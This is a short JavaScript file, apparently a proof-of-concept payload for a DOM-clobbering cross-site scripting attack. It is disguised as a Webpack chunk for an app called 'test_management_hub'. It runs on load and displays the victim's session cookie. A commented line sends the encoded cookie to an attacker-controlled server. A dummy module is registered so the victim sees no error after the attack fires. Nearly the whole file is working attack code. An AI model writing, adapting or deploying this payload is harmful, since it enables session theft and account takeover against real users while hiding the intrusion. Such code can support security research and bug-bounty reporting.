// 1. Your malicious XSS payload executes immediately when the script loads
alert('DOM Clobbered Webpack XSS! Document Cookie: ' + document.cookie);

// You can replace the alert with a payload to steal the session or perform actions:
// fetch('https://your-server.com/log?cookie=' + btoa(document.cookie));

// 2. Dummy Webpack Chunk to prevent the application from crashing
// This ensures the victim doesn't see an application error after the XSS fires
(self.webpackChunktest_management_hub = self.webpackChunktest_management_hub || []).push([
  [343], 
  {
    // Inject an empty module to satisfy Webpack's promise loader
    85343: function(module, exports, require) {
      console.log("Malicious chunk loaded seamlessly.");
    }
  }
]);